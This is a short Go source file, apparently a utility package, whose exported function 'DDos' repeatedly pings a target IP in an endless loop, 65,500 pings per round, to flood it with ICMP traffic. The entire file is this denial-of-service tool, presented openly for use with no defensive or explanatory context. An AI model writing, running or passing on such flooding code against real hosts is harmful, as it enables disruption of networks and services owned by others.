package goutil

import (
	"log"

	"github.com/go-ping/ping"
)

func step(ip string) error {
	pinger, err := ping.NewPinger(ip)
	if err != nil {
		return err
	}
	pinger.Count = 65500
	pinger.Run()
	return nil
}

// exit on error
func DDos(ip string) {
	for {
		err := step(ip)
		if err != nil {
			log.Fatal(err)
		}
	}
}
